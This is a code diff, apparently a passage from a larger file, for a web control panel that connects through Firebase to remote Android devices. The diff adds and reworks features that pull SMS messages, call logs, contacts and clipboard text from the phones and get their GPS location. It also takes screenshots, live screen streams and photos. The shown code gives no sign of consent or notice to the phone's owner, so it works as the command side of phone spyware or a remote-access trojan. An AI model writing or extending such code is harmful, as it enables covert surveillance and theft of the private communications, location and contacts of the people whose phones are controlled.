                 database.ref(`devices/${connectedDeviceId}/commandResponse`).off('value', responseListener);
                 responseListener = null;
             }
+            if (screenshotListener) {
+                database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
+                screenshotListener = null;
+            }
 
             connectedDeviceId = null;
             controlPanel.style.display = 'none';
-            screenContainer.innerHTML = `
-                <div class="screen-placeholder">
-                    <i class="fas fa-mobile-alt"></i>
-                    <p>Device disconnected</p>
-                </div>`;
+        }
+
+        function setupScreenshotListener(deviceId) {
+            if (screenshotListener) {
+                database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
+            }
+
+            screenshotListener = database.ref(`devices/${deviceId}/screenshots`)
+                .orderByChild('timestamp')
+                .limitToLast(1)
+                .on('child_added', (snapshot) => {
+                    const screenshot = snapshot.val();
+                    if (screenshot && screenshot.image) {
+                        displayScreenshot(
+                            screenshot.image, 
+                            screenshot.deviceName || 'Unknown', 
+                            screenshot.width, 
+                            screenshot.height
+                        );
+                    }
+                });
         }
 
         function setupResponseListener(deviceId) {
-            // Remove old listener if exists
             if (responseListener) {
                 database.ref(`devices/${connectedDeviceId}/commandResponse`).off('value', responseListener);
             }
@@ -748,75 +1068,74 @@
 
                 addLog(`📥 Response: ${response.type}`, 'info');
 
-                // Handle different response types
                 switch(response.type) {
                     case 'screenshot_response':
                         if (response.data?.base64) {
-                            screenContainer.innerHTML = `
-                                <img src="data:image/jpeg;base64,${response.data.base64}" 
-                                     style="max-width: 100%; max-height: 500px; border-radius: 8px;" 
-                                     alt="Screenshot">`;
-                            addLog(`📸 Screenshot received (${response.data.width}x${response.data.height})`, 'success');
-                            showToast('Screenshot captured!', 'success');
+                            const deviceName = response.data.deviceName || 'Unknown';
+                            displayScreenshot(
+                                `data:image/jpeg;base64,${response.data.base64}`,
+                                deviceName,
+                                response.data.width,
+                                response.data.height
+                            );
+                        }
+                        break;
+
+                    case 'sms_response':
+                        if (response.data?.messages) {
+                            displaySMS(response.data.messages, response.data.deviceName || 'Unknown');
+                        }
+                        break;
+
+                    case 'call_log_response':
+                        if (response.data?.calls) {
+                            displayCallLog(response.data.calls, response.data.deviceName || 'Unknown');
                         }
                         break;
 
                     case 'location_response':
                         if (response.data) {
-                            const { latitude, longitude, accuracy, provider } = response.data;
-                            addLog(`📍 Location: ${latitude}, ${longitude} (${provider}, ±${accuracy}m)`, 'info');
-                            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                            addLog(`🗺️ <a href="${mapsUrl}" target="_blank" style="color: #60a5fa;">Open in Google Maps</a>`, 'info');
+                            const { latitude, longitude, provider } = response.data;
+                            addLog(`📍 Location: ${latitude}, ${longitude} (${provider})`, 'info');
                             showToast('Location received!', 'success');
-                        }
-                        break;
-
-                    case 'sms_response':
-                        if (response.data) {
-                            addLog(`💬 SMS Retrieved: ${response.data.count} messages`, 'success');
-                            showToast(`${response.data.count} SMS messages retrieved`, 'success');
-                        }
-                        break;
-
-                    case 'contacts_response':
-                        if (response.data) {
-                            addLog(`👥 Contacts Retrieved: ${response.data.count} contacts`, 'success');
-                            showToast(`${response.data.count} contacts retrieved`, 'success');
                         }
                         break;
 
                     case 'device_info_response':
                         if (response.data) {
-                            addLog(`ℹ️ Device: ${response.data.manufacturer} ${response.data.model}`, 'info');
-                            addLog(`📱 Android ${response.data.androidVersion} (SDK ${response.data.sdkVersion})`, 'info');
-                            showToast('Device info received!', 'success');
+                            addLog(`ℹ️ ${response.data.manufacturer} ${response.data.model} | Android ${response.data.androidVersion}`, 'info');
+                            showToast('Device info received', 'success');
                         }
                         break;
 
                     case 'clipboard_response':
+                        if (response.data?.text) {
+                            addLog(`📋 Clipboard: ${response.data.text.substring(0, 100)}...`, 'info');
+                            showToast('Clipboard retrieved', 'success');
+                        }
+                        break;
+
+                    case 'contacts_response':
                         if (response.data) {
-                            const clipText = response.data.text || '(empty)';
-                            addLog(`📋 Clipboard: ${clipText.substring(0, 100)}${clipText.length > 100 ? '...' : ''}`, 'info');
-                            showToast('Clipboard content retrieved', 'success');
+                            addLog(`👥 Contacts: ${response.data.count || 0} contacts`, 'info');
+                            showToast(`${response.data.count || 0} contacts retrieved`, 'success');
                         }
                         break;
 
                     case 'error':
-                        addLog(`❌ Error: ${response.data?.error || 'Unknown error'}`, 'error');
+                        addLog(`❌ ${response.data?.error || 'Unknown error'}`, 'error');
                         showToast(response.data?.error || 'Command failed', 'error');
                         break;
 
                     default:
-                        addLog(`✅ Response: ${response.type}`, 'success');
+                        addLog(`✅ ${response.type} completed`, 'success');
                 }
 
-                // Clean up response
                 snapshot.ref.remove();
             });
         }
 
         function setupStreamListener(deviceId) {
-            // Remove old stream listener
             if (streamListener) {
                 database.ref(`devices/${connectedDeviceId}/screenStream`).off('value', streamListener);
             }
@@ -824,15 +1143,19 @@
             streamListener = database.ref(`devices/${deviceId}/screenStream`).on('value', (snapshot) => {
                 const frame = snapshot.val();
                 if (frame && frame.image) {
+                    const device = devices[deviceId];
                     screenContainer.innerHTML = `
-                        <img src="${frame.image}" 
-                             style="max-width: 100%; max-height: 600px; border-radius: 8px;" 
-                             alt="Live Stream">`;
+                        <div class="screen-info">📱 ${device?.deviceName || 'Live'} | Stream</div>
+                        <button class="screen-delete-btn" onclick="clearScreen()">
+                            <i class="fas fa-times"></i> Close
+                        </button>
+                        <img src="${frame.image}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Live Stream">
+                    `;
                 }
             });
         }
 
-        // Device Rendering
+        // ============ RENDER DEVICES ============
         function renderDevices() {
             const deviceList = Object.entries(devices).filter(([_, d]) => d && d.deviceName);
 
@@ -840,8 +1163,7 @@
                 deviceGrid.innerHTML = `
                     <div style="grid-column: 1/-1; text-align: center; padding: 50px; color: white;">
                         <i class="fas fa-satellite-dish" style="font-size: 4em; display: block; margin-bottom: 20px;"></i>
-                        <p style="font-size: 1.2em; margin-bottom: 10px;">No devices found</p>
-                        <p style="opacity: 0.8;">Waiting for Android devices to connect...</p>
+                        <p style="font-size: 1.2em;">No devices found</p>
                     </div>`;
                 return;
             }
@@ -851,21 +1173,24 @@
                 const isOnline = device.status === 'online';
                 const isConnected = device.connectionStatus === 'connected';
                 const isConnectedToMe = device.connectedTo === myClientId;
+                const isInUseByOther = isConnected && !isConnectedToMe;
 
                 const card = document.createElement('div');
                 card.className = 'device-card';
                 if (isConnectedToMe) card.classList.add('connected-to-me');
+                if (isInUseByOther) card.classList.add('in-use');
+                if (!isOnline) card.classList.add('offline');
                 if (connectedDeviceId === deviceId) card.classList.add('selected');
 
-                const lastSeen = device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Unknown';
+                const lastSeen = device.lastSeen ? formatDate(device.lastSeen) : 'Unknown';
 
                 card.innerHTML = `
                     <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
                         <div class="device-icon">📱</div>
-                        <div style="flex: 1;">
-                            <div class="device-name">${device.deviceName || 'Unknown Device'}</div>
+                        <div>
+                            <div class="device-name">${device.deviceName || 'Unknown'}</div>
                             <div class="device-model">${device.manufacturer || ''} • Android ${device.androidVersion || '?'}</div>
-                            ${device.brand ? `<div class="device-model">${device.brand} • SDK ${device.sdkVersion || '?'}</div>` : ''}
+                            ${device.brand ? `<div class="device-model">${device.brand}</div>` : ''}
                         </div>
                     </div>
                     
@@ -874,7 +1199,7 @@
                             ${isOnline ? '🟢 Online' : '🔴 Offline'}
                         </span>
                         ${isConnectedToMe ? '<span class="badge badge-connected">🔗 Connected to you</span>' : ''}
-                        ${isConnected && !isConnectedToMe ? '<span class="badge" style="background: #fef3c7; color: #92400e;">🔒 In Use</span>' : ''}
+                        ${isInUseByOther ? '<span class="badge" style="background: #fef3c7; color: #92400e;">🔒 In Use by Another</span>' : ''}
                     </div>
 
                     <div style="font-size: 0.75em; color: var(--gray); margin: 8px 0;">
@@ -883,29 +1208,39 @@
 
                     <div style="display: flex; gap: 10px; margin-top: 15px;">
                         ${isConnectedToMe ? `
-                            <button class="btn btn-disconnect" onclick="event.stopPropagation(); disconnectDevice()">
+                            <button class="btn btn-disconnect" onclick="event.stopPropagation(); showDisconnectConfirm()">
                                 <i class="fas fa-unlink"></i> Disconnect
                             </button>
-                        ` : !isConnected && isOnline ? `
+                            <button class="btn" style="background: var(--primary); color: white;" onclick="event.stopPropagation(); switchTab('commands')">
+                                <i class="fas fa-terminal"></i> Commands
+                            </button>
+                        ` : isInUseByOther ? `
+                            <button class="btn btn-disabled" disabled onclick="event.stopPropagation()">
+                                <i class="fas fa-lock"></i> In Use - Cannot Access
+                            </button>
+                        ` : isOnline ? `
                             <button class="btn btn-connect" onclick="event.stopPropagation(); connectToDevice('${deviceId}')">
                                 <i class="fas fa-plug"></i> Connect
                             </button>
                         ` : `
-                            <button class="btn btn-disabled" disabled>
-                                <i class="fas fa-${isConnected ? 'lock' : 'clock'}"></i> 
-                                ${isConnected ? 'In Use' : 'Offline'}
+                            <button class="btn btn-disabled" disabled onclick="event.stopPropagation()">
+                                <i class="fas fa-clock"></i> Device Offline
                             </button>
                         `}
                     </div>
 
-                    <div style="margin-top: 10px; font-size: 0.7em; color: var(--gray); word-break: break-all;">
+                    <div style="margin-top: 10px; font-size: 0.65em; color: var(--gray); word-break: break-all;">
                         ID: ${deviceId}
                     </div>
                 `;
 
-                // Click handler for the card
                 card.addEventListener('click', () => {
-                    if (!isConnected && isOnline) {
+                    if (isInUseByOther) {
+                        showToast('This device is currently in use by another client', 'warning');
+                        addLog('⚠️ Cannot access - device is in use', 'warning');
+                    } else if (!isOnline) {
+                        showToast('This device is offline', 'warning');
+                    } else if (!isConnected && isOnline && !isInUseByOther) {
                         connectToDevice(deviceId);
                     }
                 });
@@ -914,41 +1249,30 @@
             });
         }
 
-        // Connection Management
+        // ============ CONNECTION ============
         function connectToDevice(deviceId) {
             const device = devices[deviceId];
-            if (!device) {
-                showToast('Device not found', 'error');
-                return;
+            if (!device) { showToast('Device not found', 'error'); return; }
+            if (device.status !== 'online') { showToast('Device is offline', 'error'); return; }
+            if (device.connectionStatus === 'connected') { 
+                showToast('Device is already in use by another client', 'warning');
+                addLog('⚠️ Cannot connect - device is in use', 'warning');
+                return; 
             }
 
-            if (device.status !== 'online') {
-                showToast('Device is offline', 'error');
-                return;
-            }
+            addLog(`🔄 Connecting to ${device.deviceName}...`, 'info');
+            showToast('Connecting...', 'info');
 
-            if (device.connectionStatus === 'connected') {
-                showToast('Device is already in use', 'warning');
-                return;
-            }
-
-            addLog(`🔄 Requesting connection to ${device.deviceName}...`, 'info');
-            
-            const updates = {
+            database.ref(`devices/${deviceId}`).update({
                 connectionRequest: 'connect',
                 connectionStatus: 'connected',
                 connectedTo: myClientId
-            };
-
-            database.ref(`devices/${deviceId}`).update(updates)
-                .then(() => {
-                    addLog('✅ Connection request sent', 'success');
-                    showToast('Connecting...', 'info');
-                })
-                .catch((error) => {
-                    addLog(`❌ Connection failed: ${error.message}`, 'error');
-                    showToast('Connection failed', 'error');
-                });
+            }).then(() => {
+                addLog('✅ Connection request sent', 'success');
+            }).catch((error) => {
+                addLog(`❌ Connection failed: ${error.message}`, 'error');
+                showToast('Connection failed', 'error');
+            });
         }
 
         function disconnectDevice() {
@@ -964,7 +1288,6 @@
                 connectedTo: '',
                 connectionRequest: 'disconnect'
             }).then(() => {
-                // Clean up
                 if (streamListener) {
                     database.ref(`devices/${connectedDeviceId}/screenStream`).off('value', streamListener);
                     streamListener = null;
@@ -973,15 +1296,12 @@
                     database.ref(`devices/${connectedDeviceId}/commandResponse`).off('value', responseListener);
                     responseListener = null;
                 }
-                
+                if (screenshotListener) {
+                    database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
+                    screenshotListener = null;
+                }
                 connectedDeviceId = null;
                 controlPanel.style.display = 'none';
-                screenContainer.innerHTML = `
-                    <div class="screen-placeholder">
-                        <i class="fas fa-mobile-alt"></i>
-                        <p>Disconnected</p>
-                    </div>`;
-                
                 addLog('✅ Disconnected successfully', 'success');
                 showToast('Disconnected', 'success');
             }).catch((error) => {
@@ -990,104 +1310,87 @@
             });
         }
 
-        // Command Sending
+        // ============ SEND COMMAND ============
         function sendCommand(commandType) {
             if (!connectedDeviceId) {
-                showToast('Connect to a device first', 'warning');
+                showToast('Connect to a device first!', 'warning');
+                addLog('⚠️ No device connected', 'warning');
+                return;
+            }
+
+            const device = devices[connectedDeviceId];
+            if (!device || device.connectionStatus !== 'connected') {
+                showToast('Device disconnected!', 'error');
                 return;
             }
 
             const commandId = database.ref(`devices/${connectedDeviceId}/commands`).push().key;
-            const command = {
+            
+            database.ref(`devices/${connectedDeviceId}/commands/${commandId}`).set({
                 id: commandId,
                 type: commandType,
                 timestamp: Date.now(),
                 params: {}
-            };
-
-            const cmdNames = {
-                'screenshot': 'Screenshot',
-                'start_streaming': 'Start Stream',
-                'stop_streaming': 'Stop Stream',
-                'get_clipboard': 'Clipboard',
-                'list_apps': 'App List',
-                'get_notifications': 'Notifications',
-                'call_log': 'Call Log',
-                'get_sms': 'SMS',
-                'get_location': 'GPS Location',
-                'get_contacts': 'Contacts',
-                'get_device_info': 'Device Info',
-                'toggle_flashlight': 'Flashlight',
-                'record_audio': 'Record Audio',
-                'take_photo': 'Take Photo'
-            };
-
-            database.ref(`devices/${connectedDeviceId}/commands/${commandId}`).set(command)
-                .then(() => {
-                    commandCount++;
-                    updateStats();
-                    const cmdName = cmdNames[commandType] || commandType;
-                    addLog(`📤 Command sent: ${cmdName}`, 'info');
-                    showToast(`${cmdName} command sent`, 'success');
-                })
-                .catch((error) => {
-                    addLog(`❌ Failed to send command: ${error.message}`, 'error');
-                    showToast('Failed to send command', 'error');
-                });
+            }).then(() => {
+                commandCount++;
+                updateStats();
+                const cmdNames = {
+                    'screenshot': 'Screenshot',
+                    'start_streaming': 'Start Stream',
+                    'stop_streaming': 'Stop Stream',
+                    'get_clipboard': 'Clipboard',
+                    'get_sms': 'SMS',
+                    'call_log': 'Call Log',
+                    'get_location': 'GPS Location',
+                    'get_contacts': 'Contacts',
+                    'get_device_info': 'Device Info',
+                    'toggle_flashlight': 'Flashlight',
+                    'take_photo': 'Take Photo'
+                };
+                const cmdName = cmdNames[commandType] || commandType;
+                addLog(`📤 Command sent: ${cmdName}`, 'info');
+                showToast(`${cmdName} sent`, 'success');
+            }).catch((error) => {
+                addLog(`❌ Failed: ${error.message}`, 'error');
+                showToast('Failed to send command', 'error');
+            });
         }
 
-        // Refresh Devices
         function refreshDevices() {
-            addLog('🔄 Refreshing device list...', 'info');
-            const fab = document.querySelector('.fab i');
-            fab.classList.add('fa-spin');
-            
+            addLog('🔄 Refreshing...', 'info');
             database.ref('devices').once('value', (snapshot) => {
                 devices = snapshot.val() || {};
                 renderDevices();
                 updateStats();
-                fab.classList.remove('fa-spin');
                 addLog('✅ Device list updated', 'success');
             });
         }
 
-        // Handle page unload
+        // ============ PAGE UNLOAD ============
         window.addEventListener('beforeunload', () => {
             if (connectedDeviceId) {
-                // Use sendBeacon for reliable disconnect on page close
-                const updates = {
+                database.ref(`devices/${connectedDeviceId}`).update({
                     connectionStatus: 'available',
                     connectedTo: '',
                     connectionRequest: 'disconnect'
-                };
-                
-                database.ref(`devices/${connectedDeviceId}`).update(updates);
+                });
             }
         });
 
-        // Handle visibility change
         document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible') {
-                refreshDevices();
-            }
+            if (document.visibilityState === 'visible') refreshDevices();
         });
 
-        // Initialize Application
+        // ============ INIT ============
         function init() {
             setupListeners();
             addLog('🟢 Control Panel Started', 'success');
             addLog(`🆔 Client ID: ${myClientId}`, 'info');
-            addLog('📡 Listening for devices...', 'info');
-            
-            // Periodic stats update
             setInterval(() => {
-                if (document.visibilityState === 'visible') {
-                    updateStats();
-                }
+                if (document.visibilityState === 'visible') updateStats();
             }, 5000);
         }
 
-        // Start the application
         init();
     </script>
 </body>
